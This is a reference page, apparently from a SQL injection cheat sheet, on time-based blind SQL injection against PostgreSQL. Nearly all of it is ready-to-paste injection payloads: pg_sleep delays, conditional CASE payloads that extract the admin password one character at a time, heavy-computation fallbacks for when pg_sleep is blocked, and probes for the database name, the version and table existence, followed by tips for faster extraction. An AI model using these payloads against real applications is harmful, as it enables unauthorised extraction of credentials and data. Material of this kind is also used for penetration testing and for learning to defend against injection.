---
title: Timing
description: Using time-based techniques in PostgreSQL injections
category: Injection Techniques
order: 13
tags: ["time-based", "blind injection", "sleep"]
lastUpdated: 2025-12-15
---

## Timing

Time-based SQL injection is particularly useful in blind scenarios where no visible output is returned from the database. By causing deliberate delays in the database response, an attacker can infer whether a condition is true or false based on the time it takes for the page to load.

### PostgreSQL Sleep Function

PostgreSQL provides the `pg_sleep()` function (available since version 8.2):

```sql
-- Sleep for 5 seconds
SELECT pg_sleep(5);

-- Sleep for 500 milliseconds
SELECT pg_sleep(0.5);
```

### Basic Sleep Injection

```sql
-- Direct sleep
'; SELECT pg_sleep(5)--
' OR pg_sleep(5)--

-- In WHERE clause
' AND (SELECT pg_sleep(5))--
```

If the query takes an additional 5 seconds to return, the injection was successful.

### Conditional Sleep

More useful for data extraction is conditional sleep, which only triggers the delay if a specific condition is true:

```sql
-- Using CASE statement
' AND CASE WHEN (condition) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Example: check if admin user exists
' AND CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0 THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### Extracting Data Character by Character

```sql
-- Extract first character of password
' AND CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Using ASCII values
' AND CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>96) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### Alternative Timing Techniques

#### Heavy Computation

When `pg_sleep()` is blocked, use computation-heavy operations:

```sql
-- Generate large series
' AND (SELECT COUNT(*) FROM generate_series(1,10000000))>0--

-- Repeated hashing
' AND (SELECT md5(md5(md5(repeat('a',10000000)))))::text IS NOT NULL--
```

#### Using pg_sleep_for() and pg_sleep_until()

Both functions are available since PostgreSQL 9.4:

```sql
-- Sleep for interval
SELECT pg_sleep_for('5 seconds');

-- Sleep until specific time (5 seconds from now)
SELECT pg_sleep_until(now() + interval '5 seconds');
```

### Practical Examples

#### Extracting Database Name

```sql
-- Check if database name starts with 'p'
' AND CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN pg_sleep(3) ELSE pg_sleep(0) END--

-- Binary search on ASCII value
' AND CASE WHEN (ASCII(SUBSTRING(current_database(),1,1))>112) THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

#### Extracting PostgreSQL Version

```sql
-- Check first character of version
' AND CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

#### Enumerating Table Existence

```sql
-- Check if table exists
' AND CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')>0 THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

### Optimization Tips

1. **Binary search**: Use ASCII value comparisons to reduce requests
2. **Start with common characters**: Try 'a', 'e', 't', etc. first
3. **Adjust timing**: Use shorter delays (2-3 seconds) for faster extraction
4. **Account for network latency**: Run multiple tests to establish baseline

### Notes

- `pg_sleep()` requires PostgreSQL 8.2 or higher
- Time-based injection is slower than other methods
- Network latency can cause false positives/negatives
- Some WAFs may detect repeated slow queries
- Consider using binary search to minimize requests
